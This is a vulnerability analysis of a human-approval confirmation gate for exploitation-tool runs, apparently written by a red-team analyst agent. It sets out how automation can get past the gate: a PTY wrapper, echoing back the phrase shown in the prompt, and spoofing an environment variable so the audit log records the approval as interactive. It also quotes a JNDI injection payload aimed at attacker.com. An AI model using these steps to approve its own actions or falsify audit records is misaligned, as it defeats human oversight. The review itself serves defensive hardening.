# Zone 3 Confirmation Phrase Gate -- Vulnerability Analysis

## Document Sections

| Section | Purpose |
|---------|---------|
| [Engagement Metadata](#engagement-metadata) | Scope, phase, analyst |
| [Executive Summary (L0)](#executive-summary-l0) | Severity counts, overall posture, top finding |
| [Implementation Baseline](#implementation-baseline) | What was actually read and analyzed |
| [Attack Vector Analysis (L1)](#attack-vector-analysis-l1) | Six vectors with severity, exploitability, code-level mitigations |
| [Attack Path Analysis (L2)](#attack-path-analysis-l2) | Chaining analysis, design-level observations |
| [Prioritized Finding Register](#prioritized-finding-register) | Ranked findings table |
| [Recommended Mitigations](#recommended-mitigations) | Actionable code changes with rationale |

---

## Engagement Metadata

| Field | Value |
|-------|-------|
| Engagement ID | RED-W12-CONFIRM |
| Scope | Security review of confirmation phrase gate for Zone 3 |
| Phase | Vulnerability Analysis |
| Analyst Agent | red-vuln |
| Analysis Date | 2026-03-19 |
| Primary File | `src/interface/cli/tool_exec_commands.py` |
| Key Functions | `_prompt_zone3_approval()` (L929), `_write_approval_audit()` (L1031) |
| Methodology | PTES Vulnerability Analysis phase; OWASP Testing Guide; manual code review |

---

## Executive Summary (L0)

| Severity | Count |
|----------|-------|
| High | 2 |
| Medium | 3 |
| Low | 1 |
| Informational | 1 |

**Overall Posture:** The confirmation phrase gate is a substantial improvement over `yes/y` acceptance. The exact-match, case-sensitive comparison (`response.strip() == expected`) closes the most obvious coercion surface. The isatty() guard remains the primary non-interactive execution barrier. However, three design issues require remediation before this gate can be considered hardened for adversarial environments.

**Top Finding:** VULN-W12C-002 (High) -- The `JERRY_ZONE3_AUDIT_SOURCE` environment variable is attacker-controlled and defaults to `"interactive_tty"`, making automated audit records indistinguishable from human-interactive ones. Combined with a PTY wrapper, this creates a fully auditable-looking automated approval path.

---

## Implementation Baseline

The following is the actual gate implementation read from source (not the design description in the task). Key observations that affect the analysis:

1. The function `_prompt_zone3_approval()` has already been updated to implement the `APPROVE: <tool_command>` phrase mechanism (TASK-045). The code at L977-1004 confirms this is live, not proposed.

2. The `_write_approval_audit()` function signature at L1031-1039 accepts two optional kwargs: `confirmation_input: str | None = None` and `expected_phrase: str | None = None`. Both are passed from the approval function at L1012-1013 and written verbatim into the JSON audit record at L1129-1132.

3. `JERRY_ZONE3_AUDIT_SOURCE` is read unconditionally from the environment at L1116 with a default of `"interactive_tty"`.

4. `tool_command` flows from `getattr(args, "tool_command", None)` at L258, which is the resolved CLI positional argument after router resolution, not raw user input.

---

## Attack Vector Analysis (L1)

### VULN-W12C-001: Prompt Display Reveals Expected Phrase (Clipboard/Terminal Automation)

**Severity:** Medium
**CVSS Base:** 5.3 (AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N)
**CWE:** CWE-311 (Missing Protection of Sensitive Information in Prompt)
**ATT&CK Technique:** T1059.004 (Unix Shell -- via terminal automation scripts)

**Description:** The prompt displayed to the operator at L983-988 explicitly prints the expected phrase before the input cursor:

```
[SECURITY] Zone 3 per-operation approval required.
  Tool: impacket-GetADUsers
  Zone: 3 (Exploitation)
  Type the exact phrase to authorize: APPROVE: impacket-GetADUsers
  >
```

A script monitoring terminal output (via `script` command, `tmux` pipe-pane, `expect`, terminal logging, or a clipboard manager) can extract the expected phrase from the displayed prompt and immediately replay it as the response. The gate becomes a read-from-display and echo-back operation.

**Exploitability Assessment:** Practical in any environment where the operator's terminal session is observable. In adversarial engagement infrastructure (shared jump boxes, screen sessions), this is directly exploitable. In a solo operator environment, it provides marginal value over the old `yes` gate only against naive automation that does not parse prompt text.

**Does displaying the expected phrase weaken the gate?** Yes, in the following sense: the gate's marginal security benefit over `yes` is its resistance to agents that blindly type a fixed string. A script that reads the prompt and echoes the expected phrase bypasses this benefit entirely. The gate provides no protection against a process that has read access to the same TTY session. However, this is not a gate failure -- it is a design assumption boundary. The gate is designed to stop AI agents running in non-TTY subprocesses, not to stop processes with direct terminal access. If an attacker has terminal access sufficient to monitor output, the gate is already in a fully compromised environment.

**Mitigation:** Do not print the expected phrase inline. Instead, print a challenge token derived from a cryptographic hash of the tool_command plus a session nonce, and require the operator to compute the response. This shifts the burden to the human and is not replayable from prompt text alone.

```python
# Alternative: challenge/response that cannot be replayed from the prompt
import secrets, hashlib
nonce = secrets.token_hex(8)
challenge = hashlib.sha256(f"{tool_command}:{nonce}".encode()).hexdigest()[:8].upper()
print(f"  Challenge: {challenge}")
print(f"  Response required: APPROVE-{challenge}-{tool_command}")
expected = f"APPROVE-{challenge}-{tool_command}"
```

Note: This alternative adds operator friction. Whether the friction is acceptable is an engagement design question, not a security absolute. The current design is acceptable for its stated threat model (stop AI agents, not terminal-monitor scripts).

---

### VULN-W12C-002: JERRY_ZONE3_AUDIT_SOURCE Environment Variable Spoofing (High)

**Severity:** High
**CVSS Base:** 7.1 (AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)
**CWE:** CWE-807 (Reliance on Untrusted Inputs in a Security Decision)
**ATT&CK Technique:** T1574 (Hijack Execution Flow -- via environment manipulation)

**Description:** The audit source classification is read directly from the environment at L1116:

```python
audit_source = os.environ.get("JERRY_ZONE3_AUDIT_SOURCE", "interactive_tty")
```

This value is written into the audit record as `"source"` at L1125. The default value is `"interactive_tty"`.

An attacker (or a compromised script) that can set environment variables before invoking `jerry tool exec` can make any automated approval appear as though it originated from an interactive human TTY session. Combined with a PTY wrapper that satisfies the `sys.stdin.isatty()` check (as demonstrated by the test harness at `tests/e2e/tool_exec/test_zone3_approval.py`), this produces:

1. `isatty()` returns True (PTY satisfies this).
2. Prompt is displayed (gate proceeds normally).
3. Automated script reads the printed expected phrase and types it back.
4. Audit record is written with `"source": "interactive_tty"`.
5. A post-incident reviewer sees what appears to be a human-interactive approval.

This is the only High-severity finding because it directly undermines audit trail integrity -- the one compensating control that justifies the gate's security posture.

**Exploitability Assessment:** Directly exploitable by any process that can set environment variables before invoking `jerry`. On POSIX systems, child processes inherit the parent's environment, so a compromised wrapper script trivially sets `JERRY_ZONE3_AUDIT_SOURCE=interactive_tty` before invoking `jerry`.

**Code-Level Mitigation:** Remove the environment variable override entirely. The `source` field should be derived from observable runtime state, not from caller-supplied input:

```python
# Derive source from observable runtime facts, not env var
import platform

def _derive_audit_source() -> str:
    """Derive the audit source from observable runtime properties.

    Never accept caller-supplied override -- environment variable spoofing
    would allow automated approvals to appear interactive in audit records.
    """
    if not sys.stdin.isatty():
        return "non_interactive"
    # isatty() is True: we have a real or pseudo terminal.
    # Distinguish PTY from native terminal if possible.
    term = os.environ.get("TERM", "")
    ssh_connection = os.environ.get("SSH_CONNECTION", "")
    if ssh_connection:
        return "ssh_terminal"
    if term:
        return "interactive_tty"
    return "unknown_tty"
```

If the `JERRY_ZONE3_AUDIT_SOURCE` variable is needed for test harness purposes (as suggested by TASK-046), scope it exclusively to test environments and guard it:

```python
# Acceptable only if gated on test-mode env var
test_mode = os.environ.get("JERRY_TEST_MODE", "false").lower() == "true"
if test_mode:
    audit_source = os.environ.get("JERRY_ZONE3_AUDIT_SOURCE", "test_tty")
else:
    audit_source = _derive_audit_source()  # observable facts only
```

---

### VULN-W12C-003: Audit Field Injection via confirmation_input (Medium)

**Severity:** Medium
**CVSS Base:** 4.4 (AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L)
**CWE:** CWE-116 (Improper Encoding or Escaping of Output)
**ATT&CK Technique:** T1565.001 (Stored Data Manipulation)

**Description:** The `confirmation_input` field is the verbatim operator response stripped of leading/trailing whitespace. It is written into the audit JSON via `json.dumps()` at L1133:

```python
event["confirmation_input"] = confirmation_input  # L1130
content = json.dumps(event, indent=2) + "\n"       # L1133
```

`json.dumps()` correctly escapes JSON special characters (`"`, `\`, control characters). A JSON injection attack in the traditional sense is therefore not possible -- Python's `json.dumps()` serializes arbitrary strings safely.

However, three adjacent issues exist:

**3a. Log4Shell-pattern injection (Low risk in this stack):** If the audit file content is later ingested by a log aggregator that performs string interpolation (Splunk, Elastic with Logstash, etc.), a crafted confirmation_input such as `${jndi:ldap://attacker.com/x}` or `%{7*7}` could trigger injection in the downstream system. This is a data pipeline risk, not a code risk. The Python JSON serialization is not affected.

**3b. Unicode normalization confusion:** Certain Unicode characters survive `json.dumps()` as escape sequences but may be rendered by downstream log viewers as visually identical to ASCII characters. An operator who approves what appears to be `APPROVE: impacket-GetADUsers` but is actually `APPROVE: impacket\u2010GetADUsers` (Unicode hyphen U+2010 vs ASCII hyphen) would produce a confirmation_input that does not match the expected_phrase, so `approved` would be `False`. The gate correctly rejects this. The audit record would show both strings, making the mismatch detectable. This is an existing correctness protection, not a gap.

**3c. Unbounded input length:** `input()` in Python reads until newline with no length limit. An operator (or a process controlling stdin on a PTY) can supply a multi-megabyte string as confirmation_input. This string is written into the audit JSON file. At extreme sizes this can consume disk space and potentially cause OOM during `json.dumps()` if the string contains characters that expand significantly when JSON-encoded (e.g., null bytes).

**Code-Level Mitigation for 3c:**

```python
response = input(prompt)
# Guard against unbounded input before comparison or audit write.
MAX_RESPONSE_LEN = 512  # generous; "APPROVE: " + longest tool name + margin
if len(response) > MAX_RESPONSE_LEN:
    print(
        f"[SECURITY] Zone 3: Response exceeds maximum length ({MAX_RESPONSE_LEN} chars). "
        "Treating as denial.",
        file=sys.stderr,
    )
    _write_approval_audit(
        tool_command=tool_command,
        zone=zone,
        approved=False,
        reason="rejected: response exceeded max length",
        engagement_id=engagement_id,
        engagement_init=engagement_init,
    )
    return False
```

---

### VULN-W12C-004: tool_command Injection via Crafted CLI Argument (Low -- Mitigated by Router)

**Severity:** Low
**CVSS Base:** 2.5 (AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:L/A:N)
**CWE:** CWE-20 (Improper Input Validation)
**ATT&CK Technique:** T1059 (Command and Scripting Interpreter -- via CLI argument manipulation)

**Description:** The expected confirmation phrase is constructed as:

```python
expected = f"APPROVE: {tool_command}"
```

`tool_command` comes from `getattr(args, "tool_command", None)` at L258. This is the CLI positional argument after argparse parsing and router resolution. The question is whether a crafted `tool_command` value can manipulate the required phrase into something trivial.

**Wildcard/glob manipulation:** If a user supplies `jerry tool exec impacket-*`, argparse receives the glob-expanded result from the shell before the program sees it. On a system where no file matches `impacket-*` in the current directory, the shell passes the literal string `impacket-*`. The router's `resolve()` call at L380 would then attempt to look up `impacket-*` in the tool resolution table, which would either fail with an unrecognized tool error or match a wildcard entry. If it fails, the flow exits before reaching the approval gate. If it matches, the expected phrase becomes `APPROVE: impacket-*`, which is a longer and not shorter phrase. This does not simplify the gate.

**Empty string manipulation:** If `tool_command` somehow resolved to an empty string, the expected phrase would be `APPROVE: `, which is slightly shorter but still requires the correct prefix. The router prevents this in practice because an empty tool_command returns `ExitCode.UNKNOWN_TOOL` at L259-261.

**Newline injection in tool_command:** If `tool_command` contained a newline character, the prompt output would be visually split. However, the comparison `response.strip() == expected` uses the full string including the newline. An operator who sees a multi-line prompt would not type a newline in their response, so the comparison would fail. This is not exploitable for bypass.

**Assessment:** The router's resolution step acts as an effective sanitization layer. The tool resolution table constrains `tool_command` to registered tool names, preventing arbitrary string injection. This attack vector is Low severity because exploitation requires both shell glob expansion and a matching router entry for the malicious pattern.

**Code-Level Mitigation (belt-and-suspenders):** Add explicit validation that `tool_command` contains only expected characters before constructing the prompt:

```python
import re

_SAFE_TOOL_COMMAND_RE = re.compile(r"^[a-zA-Z0-9_\-\.]+$")

def _prompt_zone3_approval(tool_command: str, zone: str, ...) -> bool:
    # Validate tool_command characters before using in expected phrase.
    # The router should have validated this already; this is defense-in-depth.
    if not _SAFE_TOOL_COMMAND_RE.match(tool_command):
        logger.error(
            "[SECURITY] Zone 3 approval rejected: tool_command contains "
            "unexpected characters: %r",
            tool_command,
        )
        return False
    ...
```

---

### VULN-W12C-005: Timing Attack -- No Minimum Response Delay (Medium)

**Severity:** Medium
**CVSS Base:** 4.0 (AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N)
**CWE:** CWE-362 (Race Condition) / Observable Timing Discrepancy
**ATT&CK Technique:** T1059 (scripted response -- sub-technique not precisely mapped)

**Description:** There is no minimum delay enforced between when the prompt is displayed and when a response is accepted. A script that:

1. Creates a PTY wrapper (satisfying `isatty()`).
2. Reads the expected phrase from the prompt output.
3. Immediately writes the response back to the PTY master fd.

...produces a response that arrives at `input()` essentially instantaneously after the prompt is displayed. A human operator cannot type a 25+ character phrase in under 200ms. A sub-200ms response time is therefore a strong signal of automation.

**Exploitability as a bypass:** On its own, sub-200ms response does not bypass the gate -- the exact-match check still runs. However, combined with VULN-W12C-002 (audit source spoofing), it produces an approved execution with `"source": "interactive_tty"` in the audit record. The timing would be the only forensic indicator of automation, and that indicator is not currently captured in the audit record.

**Exploitability as a detection gap:** Without timing data in the audit record, forensic reviewers have no basis for distinguishing human-typed from scripted responses.

**Code-Level Mitigation:** Record the elapsed time between prompt display and response in the audit record. Optionally, reject responses that arrive faster than a human-feasible minimum:

```python
import time

prompt_displayed_at = time.monotonic()
try:
    response = input(prompt)
finally:
    response_elapsed_ms = int((time.monotonic() - prompt_displayed_at) * 1000)

# Record for forensics regardless of whether we enforce a minimum.
# Write to audit: {"response_elapsed_ms": response_elapsed_ms}

# Optional hard floor -- adjust based on phrase length.
MIN_RESPONSE_MS = 200  # lower bound; humans type at ~40-80 WPM
if response_elapsed_ms < MIN_RESPONSE_MS:
    logger.warning(
        "[SECURITY] Zone 3: response arrived %dms after prompt. "
        "This is below the human-feasible minimum. Treating as denial.",
        response_elapsed_ms,
    )
    # Still write audit with elapsed time and denial reason.
    _write_approval_audit(..., reason=f"rejected: sub-human response time ({response_elapsed_ms}ms)")
    return False
```

Note: A hard minimum delay can be defeated by a script that artificially sleeps before responding. The primary value is the forensic record, not the enforcement.

---

### VULN-W12C-006: PTY-Based Automation is the Same Attack as Terminal Echo Parsing (Informational)

**Severity:** Informational
**Assessment:** The task asks whether "terminal echo parsing" is meaningfully different from the PTY approach. The answer is: they are functionally equivalent from a security perspective.

Both approaches:
- Satisfy `sys.stdin.isatty()` (PTY provides a genuine TTY device).
- Can read the expected phrase from the prompt before responding.
- Produce responses that are indistinguishable from human input at the gate comparison layer.

The difference is implementation complexity, not security properties:
- PTY via `pty.openpty()`: Creates a master/slave pair; the script controls the master fd. Used by the test harness at `tests/e2e/tool_exec/test_zone3_approval.py`.
- `script` command recording: Captures all terminal I/O to a file; a second process tails the file and writes back. Requires two processes but no kernel PTY API knowledge.
- `expect`: A purpose-built tool for exactly this pattern. Single-process, minimal code.

All three satisfy the isatty() check and can read-and-replay the expected phrase. The gate's design correctly acknowledges this in the test file comment: "The PTY approach... is NOT a security bypass -- the security check (`isatty()`) is satisfied because a real TTY is present." The gate is designed to prevent AI agent execution in non-TTY subprocesses, not to prevent determined terminal automation. This is the correct design scope for a developer-tooling security control.

---

## Attack Path Analysis (L2)

### Path 1: Fully Automated Zone 3 Bypass (High Risk)

The following chain produces an approved Zone 3 execution with a human-looking audit record:

```
Step 1: Attacker sets JERRY_ZONE3_AUDIT_SOURCE=interactive_tty in environment.
         [Enables VULN-W12C-002: audit source spoofing]

Step 2: Attacker creates PTY pair (pty.openpty()) and launches jerry as child
         with stdin=slave_fd. sys.stdin.isatty() returns True in child.
         [PTY satisfies the isatty() guard -- demonstrated by test harness]

Step 3: Attacker's master process reads from the PTY output buffer.
         The prompt text including "APPROVE: impacket-GetADUsers" is emitted.
         [VULN-W12C-001: expected phrase is readable from prompt]

Step 4: Attacker writes "APPROVE: impacket-GetADUsers\n" to master_fd.
         Sub-200ms response time possible but not enforced.
         [VULN-W12C-005: no timing floor]

Step 5: Gate comparison: response.strip() == expected -> True.

Step 6: _write_approval_audit() writes:
         {"approved": true, "source": "interactive_tty", "confirmation_input": "APPROVE: impacket-GetADUsers"}
         [VULN-W12C-002: source field is attacker-controlled]

Step 7: Tool executes. Audit record is indistinguishable from a legitimate
         human approval.
```

**Chain Requirement:** Steps 1+2+3+4 must all succeed. Step 1 requires the ability to set an environment variable before invocation. Step 2 requires process execution capability. Both are prerequisites for invoking `jerry` at all. This chain does not provide privilege escalation beyond what the attacker already has; it provides automation of a step that is designed to require human presence.

**Impact:** The gate fails its stated purpose (ensuring human review of each Zone 3 operation) when the attacker controls the process environment.

### Path 2: Audit Record Corruption via Oversized Input

```
Step 1: Attacker controls stdin on a PTY (satisfies isatty()).
Step 2: Attacker sends a 1MB string as confirmation_input.
Step 3: String is written to audit JSON file without length check.
        [VULN-W12C-003c: unbounded input]
Step 4: Disk quota exhaustion or OOM during json.dumps() of very large string.
```

**Impact:** Denial of service against the audit trail. If disk is exhausted, subsequent legitimate approval audit writes fail, which the current code converts into a denial (FIX-R3-2). This would prevent all Zone 3 operations until the large audit file is removed.

### Design Observation: Gate Scope vs. Gate Strength

The gate's documented threat model (non-interactive AI agents auto-denied via isatty()) is sound and correctly implemented. The TASK-045 phrase requirement adds meaningful friction against naive prompting attacks (an AI agent that types `yes` unconditionally). However, the gate should not be presented as protection against a determined attacker who can:

1. Wrap `jerry` in a PTY.
2. Parse the prompt output.
3. Replay the expected phrase.

This capability is demonstrated by the test harness itself. The gate's real security value is at the design level: it forces Zone 3 operations to require interactive engagement, which means they cannot be silently triggered by LLM-generated code or compromised CI pipelines that lack a TTY.

---

## Prioritized Finding Register

| ID | Vector | Severity | Exploitability | Impact | Fix Complexity |
|----|--------|----------|---------------|--------|----------------|
| VULN-W12C-002 | JERRY_ZONE3_AUDIT_SOURCE env spoofing | High | High (set env var) | Audit trail integrity | Low (remove the env var) |
| VULN-W12C-001 | Prompt reveals expected phrase | High (design-level) | Medium (requires TTY access) | Gate bypass via automation | Medium (challenge/response redesign) |
| VULN-W12C-005 | No timing floor | Medium | Medium | No forensic signal | Low (record elapsed time) |
| VULN-W12C-003 | Audit field injection / unbounded input | Medium | Low (requires TTY + large input) | DoS against audit trail | Low (length check) |
| VULN-W12C-004 | tool_command character injection | Low | Low (router mitigates) | Prompt manipulation | Low (regex validation) |
| VULN-W12C-006 | PTY == terminal echo (informational) | Informational | N/A | Design clarity | N/A |

---

## Recommended Mitigations

### REC-001 (High -- Immediate): Remove JERRY_ZONE3_AUDIT_SOURCE Environment Override

The `audit_source` field at L1116 must not be attacker-controlled. Remove the environment variable lookup entirely. Derive the source from observable runtime facts (`sys.stdin.isatty()`, `SSH_CONNECTION`, `TERM`). If test harness identification is needed, gate it strictly on a `JERRY_TEST_MODE` variable that is checked by the test runner, never set in production.

**Code location:** `src/interface/cli/tool_exec_commands.py` L1116.

**Risk reduction:** Eliminates Path 1 Step 6 (audit record integrity), reducing the chain from "fully auditable-looking automated bypass" to "automated bypass that leaves forensic evidence of non-interactive source."

### REC-002 (Medium): Record Response Elapsed Time in Audit

Add `response_elapsed_ms` to every audit record where an interactive prompt was shown. This provides forensic evidence of automated responses even when the source field cannot definitively indicate automation. Consider adding a configurable soft floor (default 200ms) that logs a warning when breached rather than hard-denying, to avoid impacting legitimate fast typists using pre-staged clipboard paste.

**Code location:** `src/interface/cli/tool_exec_commands.py`, around L990 (`input(prompt)` call).

### REC-003 (Medium): Add Input Length Guard

Cap `input()` response at `max(len(expected) + 64, 512)` characters. Log and deny on overflow. Prevents disk exhaustion via the audit write path and eliminates any concern about oversized inputs in json.dumps().

**Code location:** `src/interface/cli/tool_exec_commands.py`, immediately after L991 (`response = input(prompt)`).

### REC-004 (Low): Add tool_command Character Validation

Before constructing `expected = f"APPROVE: {tool_command}"`, validate `tool_command` against `^[a-zA-Z0-9_\-\.]+$`. This is defense-in-depth given the router already constrains the value to registered tool names.

**Code location:** `src/interface/cli/tool_exec_commands.py`, at start of `_prompt_zone3_approval()`.

### REC-005 (Informational): Document Gate Scope in Zone 3 Rule

Update `skills/rainbow/rules/zone-3-exploit.md` Section "Per-Operation Approval Requirement" to explicitly state that the gate's threat model is non-interactive automation (AI agents, CI pipelines), not determined terminal automation. This prevents future security reviewers from expecting stronger guarantees than the gate is designed to provide.

---

*Analysis: red-vuln (RED-W12-CONFIRM)*
*Engagement: RED-W12-CONFIRM*
*Primary evidence: `src/interface/cli/tool_exec_commands.py` L929-1152*
*Secondary evidence: `tests/e2e/tool_exec/test_zone3_approval.py`, `skills/rainbow/rules/zone-3-exploit.md`*
*Methodology: PTES Vulnerability Analysis phase; OWASP A01:2021 (Broken Access Control); OWASP A07:2021 (Identification and Authentication Failures); OWASP A09:2021 (Security Logging Failures); CWE-807, CWE-116, CWE-20, CWE-362*
